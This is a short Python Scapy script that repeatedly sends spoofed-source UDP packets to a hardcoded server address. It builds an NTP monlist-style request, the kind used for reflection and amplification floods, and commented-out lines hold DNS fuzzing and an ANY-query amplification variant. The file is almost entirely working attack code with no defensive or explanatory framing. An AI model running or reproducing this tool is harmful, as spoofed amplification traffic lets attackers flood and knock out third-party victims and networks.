from scapy.all import *
import threading
import sys, os,time 

def main():
	

	fakesrc = '10.0.0.37'
	server = '144.174.16.8'
	device = 'wlp58s0'
	data="\x17\x00\x03\x2a" + "\x00" * 4
	#send(IP(dst=server, src=fakesrc)/UDP()/fuzz(DNS()), inter=1,loop=1)
	#send(IP(dst=server, src=fakesrc)/UDP(sport=51147, dport=123)/NTP(version=4)/Raw(load=data), loop=1)
	packet = (IP(dst=server, src=fakesrc)/UDP(sport=53, dport=53)/NTP(version=4)/Raw(load=data))
	while(1):
		send(packet)
	print len(packet)
	#mypacket = IP(dst=server)/UDP(dport=123, sport=8000)/data
	#l2packet = Ether()/mypacket
	#sr( l2packet*1)

	#mypacket = IP(dst=server, src=fakesrc)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
	#packet = IP(dst=server, src=fakesrc)/fuzz(UDP())/NTP(version=4)
	#request-
	#srp(packet,loop=1)	
	#mypacket.show()

if __name__=="__main__":
	main()
